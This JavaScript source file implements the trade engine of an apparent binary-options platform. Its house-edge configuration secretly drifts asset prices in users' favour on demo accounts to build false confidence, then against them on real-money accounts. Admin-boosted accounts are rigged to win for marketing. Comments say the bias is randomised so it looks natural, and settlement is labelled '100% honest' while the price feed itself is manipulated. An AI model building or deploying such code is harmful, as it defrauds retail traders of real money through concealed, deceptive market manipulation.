/**
 * Trade Engine — Handles trade placement, evaluation, and settlement.
 * Supports demo and real account types with separate balances.
 * 
 * House Edge System:
 * - Demo accounts get a subtle price bias IN the user's direction (they win ~55-60%)
 * - Real accounts get a subtle price bias AGAINST the user's direction (house wins ~55-58%)
 * - Admin-boosted accounts override the house edge with stronger user-favor bias
 * 
 * The bias works through the PriceEngine's directional drift system.
 * The chart moves naturally — no faked close prices, just subtle drift.
 */

const { createTrade, closeTrade, getUserBalance, updateBalance, updateDemoBalance, getActiveTrades, getUserRaw } = require('../config/db');

// ── House Edge Configuration ──
// These control the platform's profitability on real trades
// and the demo experience for user acquisition
const HOUSE_EDGE = {
  // Demo: bias IN user's direction → they win more, build confidence
  demo: {
    biasDirection: 'favor',    // Push price in user's predicted direction
    biasStrength: 0.06,        // Subtle drift (6% of volatility per tick)
    applyProbability: 0.60,    // Apply bias on 60% of demo trades
  },
  // Real: bias AGAINST user's direction → house maintains edge
  real: {
    biasDirection: 'against',  // Push price against user's predicted direction
    biasStrength: 0.07,        // Subtle counter-drift (7% of volatility per tick)
    applyProbability: 0.55,    // Apply bias on 55% of real trades
  },
};

class TradeEngine {
  constructor(priceEngine, io) {
    this.priceEngine = priceEngine;
    this.io = io;
    this.checkInterval = null;
  }

  async placeTrade(userId, { asset, direction, amount, expiry_duration, account_type = 'demo' }) {
    const currentPrice = this.priceEngine.getCurrentPrice(asset);
    if (!currentPrice) {
      throw new Error(`Invalid asset: ${asset}`);
    }

    const balance = await getUserBalance(userId, account_type);
    if (balance === null) {
      throw new Error('User not found');
    }
    if (balance < amount) {
      throw new Error('Insufficient balance');
    }
    if (amount < 1) {
      throw new Error('Minimum trade amount is $1');
    }
    if (!['buy', 'sell'].includes(direction)) {
      throw new Error('Direction must be buy or sell');
    }

    // Deduct the trade amount from the correct balance
    const newBalance = parseFloat((balance - amount).toFixed(2));
    if (account_type === 'real') {
      await updateBalance(userId, newBalance);
    } else {
      await updateDemoBalance(userId, newBalance);
    }

    const trade = await createTrade({
      user_id: userId,
      asset,
      direction,
      amount,
      strike_price: currentPrice,
      payout_percent: 0.95,
      expiry_duration,
      account_type
    });

    // ── Determine bias for this trade ──
    const user = await getUserRaw(userId);
    const adminBoost = user?.win_rate_boost;

    if (adminBoost && adminBoost > 0) {
      // Admin-boosted account — strong bias in user's favor (marketing/demo)
      // Overrides the house edge completely
      const roll = Math.random();
      if (roll < adminBoost) {
        const biasStrength = 0.08 + (adminBoost - 0.5) * 0.15;
        this.priceEngine.addBias(trade.id, asset, direction, expiry_duration, biasStrength);
      }
    } else {
      // Standard user — apply house edge based on account type
      this._applyHouseEdge(trade, direction, asset, expiry_duration, account_type);
    }

    return {
      ...trade,
      strike_price: currentPrice,
      balance: newBalance
    };
  }

  /**
   * Apply house edge bias based on account type.
   * Demo: bias favors user (they win more, stay engaged)
   * Real: bias favors house (platform profitability)
   */
  _applyHouseEdge(trade, direction, asset, durationSec, accountType) {
    const config = HOUSE_EDGE[accountType] || HOUSE_EDGE.real;
    
    // Probabilistic: not every trade gets bias (looks more natural)
    const roll = Math.random();
    if (roll > config.applyProbability) return; // No bias this trade

    // Determine bias direction
    let biasDirection;
    if (config.biasDirection === 'favor') {
      // Push price in user's predicted direction → user wins
      biasDirection = direction; // same as user's direction
    } else {
      // Push price against user's predicted direction → house wins
      biasDirection = direction === 'buy' ? 'sell' : 'buy'; // opposite
    }

    this.priceEngine.addBias(
      trade.id,
      asset,
      biasDirection,
      durationSec,
      config.biasStrength
    );
  }

  startEvaluationLoop(intervalMs = 500) {
    if (this.checkInterval) return;

    this.checkInterval = setInterval(() => {
      this._evaluateExpiredTrades();
    }, intervalMs);

    console.log('[TradeEngine] Evaluation loop started');
    console.log(`[TradeEngine] House edge active — Demo: ${HOUSE_EDGE.demo.applyProbability * 100}% bias favor | Real: ${HOUSE_EDGE.real.applyProbability * 100}% bias against`);
  }

  stopEvaluationLoop() {
    if (this.checkInterval) {
      clearInterval(this.checkInterval);
      this.checkInterval = null;
    }
  }

  async _evaluateExpiredTrades() {
    const now = new Date().toISOString();
    const activeTrades = await getActiveTrades();

    for (const trade of activeTrades) {
      if (trade.expires_at <= now) {
        await this._settleTrade(trade);
      }
    }
  }

  async _settleTrade(trade) {
    const closePrice = this.priceEngine.getCurrentPrice(trade.asset);
    if (closePrice === null) return;

    // Remove any bias for this trade (it's done)
    this.priceEngine.removeBias(trade.id, trade.asset);

    // 100% honest settlement — just check actual price vs strike
    let won = false;
    if (trade.direction === 'buy') {
      won = closePrice > trade.strike_price;
    } else {
      won = closePrice < trade.strike_price;
    }

    const status = won ? 'won' : 'lost';
    const payout = won ? parseFloat((trade.amount + trade.amount * trade.payout_percent).toFixed(2)) : 0;
    const acctType = trade.account_type || 'demo';

    await closeTrade(trade.id, closePrice, status, payout);

    // Update the correct balance if won
    if (won) {
      const currentBalance = await getUserBalance(trade.user_id, acctType);
      if (currentBalance !== null) {
        const newBal = parseFloat((currentBalance + payout).toFixed(2));
        if (acctType === 'real') {
          await updateBalance(trade.user_id, newBal);
        } else {
          await updateDemoBalance(trade.user_id, newBal);
        }
      }
    }

    // Emit result via Socket.IO to the user
    const currentBal = await getUserBalance(trade.user_id, acctType);
    const result = {
      tradeId: trade.id,
      asset: trade.asset,
      direction: trade.direction,
      amount: trade.amount,
      strike_price: trade.strike_price,
      close_price: closePrice,
      status,
      payout,
      account_type: acctType,
      balance: currentBal
    };

    // Emit to the specific user's room
    this.io.to(`user:${trade.user_id}`).emit('trade_result', result);
    
    const user = await getUserRaw(trade.user_id);
    const boostTag = user?.win_rate_boost ? ` [BOOST:${(user.win_rate_boost*100).toFixed(0)}%]` : '';
    const edgeTag = !user?.win_rate_boost ? ` [EDGE:${acctType}]` : '';
    console.log(`[TradeEngine] Trade ${trade.id} settled: ${status} [${acctType}]${boostTag}${edgeTag} | Payout: $${payout}`);
  }
}

module.exports = TradeEngine;
